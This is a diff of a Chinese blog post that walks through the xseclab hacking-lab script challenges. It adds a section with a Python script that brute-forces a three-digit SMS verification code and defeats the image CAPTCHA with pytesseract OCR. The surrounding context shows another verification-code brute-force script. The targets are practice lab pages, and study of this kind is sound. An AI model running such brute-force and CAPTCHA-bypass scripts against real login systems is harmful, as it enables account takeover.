@@ -130,7 +130,7 @@
 <meta property="og:image" content="https://i.imgur.com/kZEqUM7.png">
 <meta property="og:image" content="https://i.imgur.com/WCRcYrG.png">
 <meta property="og:image" content="https://i.imgur.com/j74pYVA.png">
-<meta property="og:updated_time" content="2019-02-18T12:52:41.959Z">
+<meta property="og:updated_time" content="2019-02-25T12:23:49.034Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WP-hackinglab 脚本关（py脚本）">
 <meta name="twitter:description" content="key又又找不到了点击_到这里找key__后跳转到了没有key的页面，明显的跳转抓下来./search_key.php这个页面就好123456import requestsssion = requests.Session()url = &quot;http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php&quot;r =">
@@ -396,8 +396,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-02-18T20:52:41+08:00">
-                2019-02-18
+              <time title="更新于" itemprop="dateModified" datetime="2019-02-25T20:23:49+08:00">
+                2019-02-25
               </time>
             
           </span>
@@ -451,7 +451,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,294 字
+                  1,496 字
                 </span>
               
 
@@ -467,7 +467,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  7 分钟
+                  8 分钟
                 </span>
               
             </div>
@@ -504,6 +504,8 @@
 <h1 id="逗比的手机验证码"><a href="#逗比的手机验证码" class="headerlink" title="逗比的手机验证码"></a><a href="http://lab1.xseclab.com/vcode5_mobi_5773f3def9f77f439e058894cefc42a8/" title="逗比的手机验证码" target="_blank" rel="noopener">逗比的手机验证码</a></h1><p>获取验证码后提交，发现需要以13388886667提交，<br>那么：获取验证码，提交，bp抓到，改手机号，提交即可</p>
 <h1 id="基情燃烧的岁月"><a href="#基情燃烧的岁月" class="headerlink" title="基情燃烧的岁月"></a><a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/" title="基情燃烧的岁月" target="_blank" rel="noopener">基情燃烧的岁月</a></h1><p>先爆破验证码：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'13388886666'</span>, <span class="string">'vcode'</span>: num, <span class="string">'Login'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find vcode! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://i.imgur.com/WCRcYrG.png" alt=""><br>换手机号13399999999继续爆破：<br><img src="https://i.imgur.com/j74pYVA.png" alt=""></p>
+<h1 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a><a href="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php" title="验证码识别" target="_blank" rel="noopener">验证码识别</a></h1><p>查看源码以及提示中可以看到，验证码是三位数100-999<br>查看源码，分析js脚本可得知，每次提交需要点击获取验证码<br>脚本如下：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php'</span></span><br><span class="line">urlmobi = <span class="string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/mobi_vcode.php'</span></span><br><span class="line">imageurl = <span class="string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="built_in">in</span> range(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = s.post(urlmobi, <span class="keyword">data</span>=&#123;<span class="string">'getcode'</span>: <span class="string">'1'</span>, <span class="string">'mobi'</span>: <span class="string">'13388886666'</span>&#125;)</span><br><span class="line">    r = s.get(imageurl)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'1.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="built_in">in</span> r.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            <span class="keyword">if</span> i:</span><br><span class="line">                f.write(i)</span><br><span class="line">    <span class="keyword">text</span> = pytesseract.image_to_string(<span class="string">'1.png'</span>).replace(<span class="string">' '</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">data</span> = &#123;<span class="string">'username'</span>: <span class="string">'13388886666'</span>, <span class="string">'mobi_code'</span>: num, <span class="string">'user_code'</span>: <span class="keyword">text</span>, <span class="string">'Login'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    result = s.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(num, <span class="keyword">text</span>, result)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> <span class="built_in">not</span> <span class="built_in">in</span> result:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure></p>
+<p>pytesseract识别验证码会有误差，多试几次即可<br>也可使用tesserocr</p>
 
       
     </div>
@@ -817,7 +819,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#key又又找不到了"><span class="nav-number">1.</span> <span class="nav-text">key又又找不到了</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#快速口算"><span class="nav-number">2.</span> <span class="nav-text">快速口算</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#这个题目是空的"><span class="nav-number">3.</span> <span class="nav-text">这个题目是空的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#怎么就是不弹出key呢？"><span class="nav-number">4.</span> <span class="nav-text">怎么就是不弹出key呢？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比验证码第一期"><span class="nav-number">5.</span> <span class="nav-text">逗比验证码第一期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比验证码第二期"><span class="nav-number">6.</span> <span class="nav-text">逗比验证码第二期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比的验证码第三期（SESSION）"><span class="nav-number">7.</span> <span class="nav-text">逗比的验证码第三期（SESSION）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比的手机验证码"><span class="nav-number">8.</span> <span class="nav-text">逗比的手机验证码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基情燃烧的岁月"><span class="nav-number">9.</span> <span class="nav-text">基情燃烧的岁月</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#key又又找不到了"><span class="nav-number">1.</span> <span class="nav-text">key又又找不到了</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#快速口算"><span class="nav-number">2.</span> <span class="nav-text">快速口算</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#这个题目是空的"><span class="nav-number">3.</span> <span class="nav-text">这个题目是空的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#怎么就是不弹出key呢？"><span class="nav-number">4.</span> <span class="nav-text">怎么就是不弹出key呢？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比验证码第一期"><span class="nav-number">5.</span> <span class="nav-text">逗比验证码第一期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比验证码第二期"><span class="nav-number">6.</span> <span class="nav-text">逗比验证码第二期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比的验证码第三期（SESSION）"><span class="nav-number">7.</span> <span class="nav-text">逗比的验证码第三期（SESSION）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比的手机验证码"><span class="nav-number">8.</span> <span class="nav-text">逗比的手机验证码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基情燃烧的岁月"><span class="nav-number">9.</span> <span class="nav-text">基情燃烧的岁月</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#验证码识别"><span class="nav-number">10.</span> <span class="nav-text">验证码识别</span></a></li></ol></div>
             
 
           </div>
@@ -851,7 +853,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">28.6k</span>
+    <span title="Site words total count">28.8k</span>
   
 </div>
 
